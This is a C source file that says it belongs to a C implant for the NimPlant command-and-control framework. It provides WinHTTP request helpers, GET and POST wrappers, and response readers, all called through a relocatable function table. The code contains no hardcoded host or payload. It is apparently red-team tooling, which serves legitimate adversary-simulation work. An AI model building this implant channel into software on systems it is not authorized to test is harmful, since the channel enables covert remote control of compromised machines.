/**
 * GNU General Public License, version 2.0.
 *
 * Copyright (c) 2025 Tijme Gommers (@tijme).
 *
 * This source code file is part of C-implant for NimPlant C2. 
 * Licensed under GNU General Public License, version 2.0, and 
 * you are free to use, modify, and distribute this file under 
 * its terms. However, any modified versions of this file must 
 * include this same license and copyright notice.
 */

/**
 * Standard Input Output.
 * 
 * Defines three variable types, several macros, and various functions for performing input and output.
 * https://www.tutorialspoint.com/c_standard_library/stdio_h.htm
 */
#include <stdio.h>

/**
 * Standard Library.
 * 
 * Defines four variable types, several macros, and various functions for performing general functions.
 * https://www.tutorialspoint.com/c_standard_library/stdlib_h.htm
 */
#include <stdlib.h>

/**
 * Booleans.
 * 
 * Defines boolean types.
 * https://pubs.opengroup.org/onlinepubs/007904975/basedefs/stdbool.h.html
 */
#include <stdbool.h>

/**
 * Integers.
 * 
 * Defines macros that specify limits of integer types corresponding to types defined in other standard headers.
 * https://pubs.opengroup.org/onlinepubs/009696899/basedefs/stdint.h.html
 */
#include <stdint.h>

/**
 * Windows API.
 * 
 * Contains declarations for all of the functions, macro's & data types in the Windows API.
 * https://docs.microsoft.com/en-us/previous-versions//aa383749(v=vs.85)?redirectedfrom=MSDN
 */
#include <windows.h>

/**
 * Used by the Windows HTTP services.
 * 
 * Contains manifests, macros, types and prototypes for Windows HTTP Services.
 * https://learn.microsoft.com/en-us/windows/win32/api/winhttp/
 */
#include <winhttp.h>

/**
 * Perform an HTTP request based on the given parameters.
 * 
 * @param struct Relocatable* context A struct with all loaded modules & functions.
 * @param wchar_t* wHostname The domain (including subdomains) to connect to.
 * @param wchar_t* wPath The path (starting with /) to connect to.
 * @param DWORD nPort The TCP port to connect to.
 * @param bool bSecure If SSL/TLS must be used.
 * @param wchar_t* wMethod The HTTP request method (e.g. GET or POST).
 * @param char* cData Optional data that is sent with e.g. a POST or PUT request.
 * @param wchar_t* wUserAgent The user agent to use for the HTTP request.
 * @param wchar_t** wHeaders An array of wide-character strings representing custom headers.
 * @param size_t dHeaderCount The number of custom headers provided.
 * @param HINTERNET* hSession A pointer to which the session handle will be stored.
 * @param HINTERNET* hRequest A pointer to which the request handle will be stored.
 * @return bool Positive if the request succeeded.
 */
bool HttpRequest(struct Relocatable* context, wchar_t* wHostname, wchar_t* wPath, DWORD nPort, bool bSecure, wchar_t* wMethod, char* cData, wchar_t* wUserAgent, wchar_t** wHeaders, size_t dHeaderCount, HINTERNET* hSession, HINTERNET* hRequest) {
    HINTERNET hConnect;
    BOOL bStatus = false;
    wchar_t* wFinalHeaders = NULL;
    size_t dTotalHeaderLength = 0;

    *hSession = context->functions.WinHttpOpen(wUserAgent, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_BYPASS, WINHTTP_NO_PROXY_BYPASS, 0);
    if (*hSession == NULL) {
        goto CLEANUP_AND_RETURN;
    }

    hConnect = context->functions.WinHttpConnect(*hSession, (LPCWSTR) wHostname, nPort, 0);
    if (hConnect == NULL) {
        goto CLEANUP_AND_RETURN;
    }

    *hRequest = context->functions.WinHttpOpenRequest(hConnect, wMethod, wPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, (bSecure ? WINHTTP_FLAG_SECURE : 0));
    if (hRequest == NULL) {
        goto CLEANUP_AND_RETURN;
    }

    // Calculate total header length
    for (size_t i = 0; i < dHeaderCount; i++) {
        dTotalHeaderLength += context->functions.wcslen(wHeaders[i]) + 2; // +2 for \r\n
    }
    
    if (dHeaderCount > 0) {
        DEFINE_WSTRING(wNewLine, "\r\n");

        size_t wFinalHeadersLength = (dTotalHeaderLength + 1) * sizeof(wchar_t);
        wFinalHeaders = (wchar_t*) context->functions.calloc(wFinalHeadersLength + 1, sizeof(wchar_t));
        if (!wFinalHeaders) goto CLEANUP_AND_RETURN;
        
        for (size_t i = 0; i < dHeaderCount; i++) {
            context->functions.wcscat_s(wFinalHeaders, wFinalHeadersLength, wHeaders[i]);
            context->functions.wcscat_s(wFinalHeaders, wFinalHeadersLength, wNewLine);
        }
    }

    if (cData == NULL) {
        if (!context->functions.WinHttpSendRequest(*hRequest, wFinalHeaders, (dHeaderCount > 0) ? -1 : 0, NULL, 0, 0, 0)) {
            goto CLEANUP_AND_RETURN;
        }
    } else {
        size_t dataLen = context->functions.strlen(cData);
        if (!context->functions.WinHttpSendRequest(*hRequest, wFinalHeaders, (dHeaderCount > 0) ? -1 : 0, cData, dataLen, dataLen, 0)) {
            goto CLEANUP_AND_RETURN;
        }
    }

    if (!context->functions.WinHttpReceiveResponse(*hRequest, NULL)) {
        goto CLEANUP_AND_RETURN;
    }

    bStatus = true;

CLEANUP_AND_RETURN:
    if (hConnect != NULL) context->functions.WinHttpCloseHandle(hConnect);
    if (wFinalHeaders) context->functions.free(wFinalHeaders);

    return bStatus;
}

/**
 * Perform an HTTP GET request based on the given parameters.
 * 
 * @param struct Relocatable* context A struct with all loaded modules & functions.
 * @param wchar_t* wHostname The domain (including subdomains) to connect to.
 * @param wchar_t* wPath The path (starting with /) to connect to.
 * @param DWORD nPort The TCP port to connect to.
 * @param bool bSecure If SSL/TLS must be used.
 * @param wchar_t* wUserAgent The user agent to use for the HTTP request.
 * @param wchar_t** wHeaders An array of wide-character strings representing custom headers.
 * @param size_t dHeaderCount The number of custom headers provided.
 * @param HINTERNET* hSession A pointer to which the session handle will be stored.
 * @param HINTERNET* hRequest A pointer to which the request handle will be stored.
 * @return bool Positive if the request succeeded.
 */
bool HttpGetRequest(struct Relocatable* context, wchar_t* wHostname, wchar_t* wPath, DWORD nPort, bool bSecure, wchar_t* wUserAgent, wchar_t** wHeaders, size_t dHeaderCount, HINTERNET* hSession, HINTERNET* hRequest) {
    DEFINE_WSTRING(get, "GET");
    return HttpRequest(context, wHostname, wPath, nPort, bSecure, get, NULL, wUserAgent, wHeaders, dHeaderCount, hSession, hRequest);
}

/**
 * Perform an HTTP POST request based on the given parameters.
 * 
 * @param struct Relocatable* context A struct with all loaded modules & functions.
 * @param wchar_t* wHostname The domain (including subdomains) to connect to.
 * @param wchar_t* wPath The path (starting with /) to connect to.
 * @param DWORD nPort The TCP port to connect to.
 * @param bool bSecure If SSL/TLS must be used.
 * @param char* sData Optional data that is sent with the POST request.
 * @param wchar_t* wUserAgent The user agent to use for the HTTP request.
 * @param wchar_t** wHeaders An array of wide-character strings representing custom headers.
 * @param size_t dHeaderCount The number of custom headers provided.
 * @param HINTERNET* hSession A pointer to which the session handle will be stored.
 * @param HINTERNET* hRequest A pointer to which the request handle will be stored.
 * @return bool Positive if the request succeeded.
 */
bool HttpPostRequest(struct Relocatable* context, wchar_t* wHostname, wchar_t* wPath, DWORD nPort, bool bSecure, char* sData, wchar_t* wUserAgent, wchar_t** wHeaders, size_t dHeaderCount, HINTERNET* hSession, HINTERNET* hRequest) {
    DEFINE_WSTRING(post, "POST");
    return HttpRequest(context, wHostname, wPath, nPort, bSecure, post, sData, wUserAgent, wHeaders, dHeaderCount, hSession, hRequest);
}
/**
 * Retrieve the HTTP response status of the given request handle.
 * 
 * @param struct Relocatable* context A struct with all loaded modules & functions.
 * @param HINTERNET* hRequest A valid pointer to an open request handle.
 * @param DWORD* lpdwResponseStatus The obtained HTTP response status.
 * @return bool Positive if the retrieval succeeded.
 */
bool GetHttpResponseStatus(struct Relocatable* context, HINTERNET hRequest, DWORD* lpdwResponseStatus) {
    BOOL bStatus = false;
    DWORD dwResponseStatusSize = sizeof(DWORD);

    if (!context->functions.WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, lpdwResponseStatus, &dwResponseStatusSize, NULL)) {
        goto RETURN;
    }

    bStatus = true;

RETURN:
    return bStatus;
}

/**
 * Retrieve the HTTP response body of the given request handle.
 * 
 * @param struct Relocatable* context A struct with all loaded modules & functions.
 * @param HINTERNET* hRequest A valid pointer to an open request handle.
 * @param uint8_t** lpResponseBody The obtained HTTP response body.
 * @return bool Positive if the retrieval succeeded.
 */
bool GetHttpResponseBody(struct Relocatable* context, HINTERNET hRequest, uint8_t** lpResponseBody) {
    BOOL bStatus = false;
    DWORD dwNumberOfBytesToRead = 0;
    DWORD dwNumberOfBytesRead = 0;
    DWORD dwResponseBodySize = 0;
    *lpResponseBody = NULL;

    do {
        if (!context->functions.WinHttpQueryDataAvailable(hRequest, &dwNumberOfBytesToRead)) {
            goto CLEANUP_AND_RETURN;
        }

        if (dwNumberOfBytesToRead == 0) {
            goto SUCCESS_AND_RETURN;
        }

        *lpResponseBody = context->functions.realloc(*lpResponseBody, dwResponseBodySize + dwNumberOfBytesToRead);
   
        if(!context->functions.WinHttpReadData(hRequest, *lpResponseBody + dwResponseBodySize, dwNumberOfBytesToRead, &dwNumberOfBytesRead)) {
            goto CLEANUP_AND_RETURN;
        }

        dwResponseBodySize = dwResponseBodySize + dwNumberOfBytesRead;
    } while (dwNumberOfBytesRead > 0);

SUCCESS_AND_RETURN:
    bStatus = true;
    goto RETURN;

CLEANUP_AND_RETURN:
    if (*lpResponseBody != NULL) context->functions.free(*lpResponseBody);

RETURN:
    return bStatus;
}